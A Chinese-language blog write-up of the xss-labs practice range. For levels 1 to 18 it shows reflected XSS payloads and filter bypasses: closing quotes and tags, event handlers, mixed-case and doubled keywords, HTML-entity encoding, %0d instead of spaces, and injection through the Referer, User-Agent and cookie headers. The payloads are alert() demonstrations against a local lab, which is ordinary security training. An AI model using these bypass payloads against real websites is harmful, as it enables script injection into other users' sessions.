---
title: xss-labs靶场练习
date: 2022-02-17 11:59:07
tags: web
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-wqllpx_1920x1080.png
---

# xss-labs靶场练习

## Level 1

<img src="https://raw.githubusercontent.com/todis21/image/main/img/1645071060231.png" alt="1645071060231" style="zoom: 50%;" />

观察url的构造，这里是向服务器提交了个名为`name`的参数,值为`text`，并且值和值的长度都在页面有回显。

查看网页源码

![QQ截图20220217142356](https://raw.githubusercontent.com/todis21/image/main/img/QQ%E6%88%AA%E5%9B%BE20220217142356.png)

name参数的值直接插入到了<h2></h2>标签之中。那么这样看来这一关主要就是考察反射型XSS。

```
payload:name=<script>alert('xss')</script>
```

## Level 2

![image-20220217143223741](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143223741.png)

从url地址来看，依然是get方式传递参数，所以猜测考察的还是反射型XSS。只不过这一关将参数名换成了keyword。

查看页面源码

![image-20220217143513098](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143513098.png)

这里有两个地方回显值的地方，利用第一关的payload试试

![image-20220217143809347](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143809347.png)

观察源码，第一处回显处的特殊字符被编码了，不能利用，第二处的回显处可以完整的回显值，可以利用这里构造payload,

这里需要构造闭合

```
"><script>alert('xss')</script>
```

## Level 3

url构造同上一关

![image-20220217144449415](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217144449415.png)

页面源码和上一关的差不多，只是双引号变成单引号

![image-20220217144758278](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217144758278.png)

尝试构造payload：

```
'><script>alert('xss')</script>
```

发现并没有弹窗，继续观察源码

![image-20220217145017841](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217145017841.png)

发现这关的<,>被编码成了html实体。经过查看php文件，在这两处都用htmlspecialchars()函数进行了处理。

![image-20220217145359528](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217145359528.png)

所以这里不能用含有<>的payload

这里可以通过`<input>`标签的一些特殊事件来执行js代码:

```
' onmouseover=javascript:alert(1) '
```

## Level 4

![image-20220217150532899](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217150532899.png)

查看源码

![image-20220217150738232](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217150738232.png)

这一关只是把上一关的单引号变成了双引号,payload构造如下

```
" onmouseover=javascript:alert(1) "
```

## Level 5

![ccc](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217151227524.png)

查看页面源码

![image-20220217153208676](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217153208676.png)

这和上一关的源码差不多，直接用上一关的payload，无法弹窗

![image-20220217153541015](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217153541015.png)

发现`onmouseover`变成了`o_nmouseover`,经过测试`<script>`和`onclick`也被_分隔了

这里不用`<input>`标签了，把它闭合掉,用a标签试试

```
"><a href="javascript:alert(1)">link</a> <"
```

![image-20220217154340891](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217154340891.png)

点击link弹窗。进入下一关

## Level 6

![image-20220217155856005](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217155856005.png)

源码和上一关差不多

![image-20220217160010837](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160010837.png)

尝试使用上一关的payload,并没有出现弹窗

![image-20220217160114004](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160114004.png)

![image-20220217160153498](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160153498.png)

发现这里的`href`也被`_`分隔了

因为html对大小写不敏感，即不区分大小写，这里可以试试下面的payload

```
"><a Href="javascript:alert(111)">link</a> <"
```

![image-20220217161822841](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217161822841.png)

点击link弹窗。进入下一关

## Level 7

![image-20220217210116917](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217210116917.png)

页面源码与上一关的雷同，用上一关的payload：`"><a Href="javascript:alert(1)">link</a> <"`试试

![image-20220217210446573](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217210446573.png)

发现这里过滤了`script`和`href`,可以用双写绕过，即在script里面再插入一个script,如`scrscriptipt`,

当script被过滤后，剩下的拼接起来刚好能组合成script,href也同理

payload

```
"><a hRhrefef="javascriscriptpt:alert('111')">link</a><"
```

![image-20220217211132648](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217211132648.png)

点击link弹窗。进入下一关

## Level 8

![image-20220217211535003](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217211535003.png)

这关多了一个“友情链接”，按照套路，这里应该是利用点

首先先查看页面源码

![image-20220217212026427](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217212026427.png)

回显值的地方有两个，用上一关的payload试试水

![image-20220217212158383](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217212158383.png)

可以发现，第一个回显处被htmlspecialchars()函数进行了处理，第二个回显处href和script都被`_`分隔了

可以对第二处进行构造payload

```
javascript:alert(1)
```

这里的scrpit会被分隔，所以将它进行unicode编码

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

![image-20220217213124300](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217213124300.png)

点击`友情链接`即可弹窗

## Level 9

![image-20220217214219071](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217214219071.png)

查看源码

![image-20220217214603403](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217214603403.png)

这里显示链接不合法，经过测试，提交的内容里只要含有`http://`就合法,https://不行

![image-20220217215516760](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217215516760.png)

尝试payload ： javascript:alert(http://)

![image-20220217215653634](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217215653634.png)

发现script被分隔了，可以将script进行unicode编码绕过

```
java&#115;&#99;&#114;&#105;&#112;&#116;:alert('http://')
```

![image-20220217220749312](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217220749312.png)

点击`友情链接`即可弹窗

## Level 10

![image-20220217222013957](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217222013957.png)

传递keyword值为`<script>alert(111)</script>`进行测试

![image-20220217222505101](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217222505101.png)

可以看到回显值的地方被htmlspecialchars()函数进行了处理，还有三个隐藏的输入框，尝试向它们传值

```
?keyword=1111&t_link=222&t_history=333&t_sort=444
```

![image-20220217223126794](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223126794.png)

发现t_sort有回显，在这里构造payload

```
t_sort=" onmouseover=javascript:alert(1) " type="text
```

![image-20220217223555926](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223555926.png)

![image-20220217223608521](https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223608521.png)

## Level 11

![image-20220218080510169](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218080510169.png)

这关的页面源码和上一关的雷同，多了个隐藏的输入框`t_ref`,value值为上一关的url

![image-20220218081735399](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218081735399.png)

这里可以猜测，这个参数的值，是来源于请求头Referer,通过referer来传入payload

```
" onmouseover=javascript:alert(1) " type="text
```

![image-20220218082110453](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082110453.png)

可以弹窗进入下一关

![image-20220218082133492](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082133492.png)

## Level 12

![image-20220218082535475](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082535475.png)

这一关又多了个隐藏的输入框`t_ua`,看它的值可以知道它的值来源于User-Agent

![image-20220218082846721](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082846721.png)

通过User-Agent传入上一关的payload即可弹窗

![image-20220218083019729](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218083019729.png)

![image-20220218083052475](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218083052475.png)

## Level 13

![](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218092723595.png)

查看页面源码，发现这次的隐藏输入框是`t_cook`,它的值是来自Cookies

![](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093119924.png)

同样的套路，吧上一关的payload加到cookie即可

![](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093319008.png)

成功弹窗进入下一关

![](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093341818.png)

## Level 14

这一关是Exif xss,php的`exif_read_data`函数读出exif信息，读出的值直接未经过滤的输出，就会导致Xss的发生。

网站打不开，这关跳过

## Level 15

![image-20220218113901942](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218113901942.png)

查看源码发现`angular.min.js`

![image-20220218114103327](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114103327.png)

URL的src参数回显在下面的ng-include

![image-20220218114236036](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114236036.png)

ng-include相当于php的include函数，所以我们包含一个有XSS漏洞的URL就可触发这里的XSS。

在本地写个html文件，把地址传给src即可

```
<input type="text" name="" onclick=alert('xss')>
```

```
http://localhost/xss-labs/level15.php?src="http://localhost/2.html"
```

![image-20220218114850262](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114850262.png)

## Level 16

![image-20220218115116596](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115116596.png)

观察url构造，发现这一关是通过get一个keyword来传递参数

![image-20220218115243816](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115243816.png)

参数值回显在`<center>`标签中，使用`<img>`标签来弹窗

```
<img src='' onerror=alert(111)>
```

```
http://localhost/xss-labs/level16.php?keyword=<img src='' onerror=alert(111)>
```

传值后没有弹窗，观察页面源码得知，空格被转义了

![image-20220218115733037](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115733037.png)

空格可以用`%20 %09 %0a %0b %0c %0d %a0 %00`代替，经过测试`%0d`可以用

所以payload为

```
http://localhost/xss-labs/level16.php?keyword=<img%0dsrc=''%0donerror=alert(111)>
```

弹窗成功

## Level 17

![image-20220218120659720](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218120659720.png)

这有个flash，但是这关和它没有关系

发现url有个?arg01=a&arg02=b，再观察一下页面源码

![image-20220218121009693](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218121009693.png)

发现两个参数的值回显在`<embed>`标签中，可以通过构该标签的特殊事件进行弹窗

```
?arg01=a%0aonmouseover&arg02=alert(1)
```

![image-20220218122200252](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122200252.png)



![image-20220218122212241](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122212241.png)

## Level 18

这一关的页面源码和上一关的没什么区别，直接用上一关的payload即可

![image-20220218122616195](https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122616195.png)

## Level 19/20

摆烂！

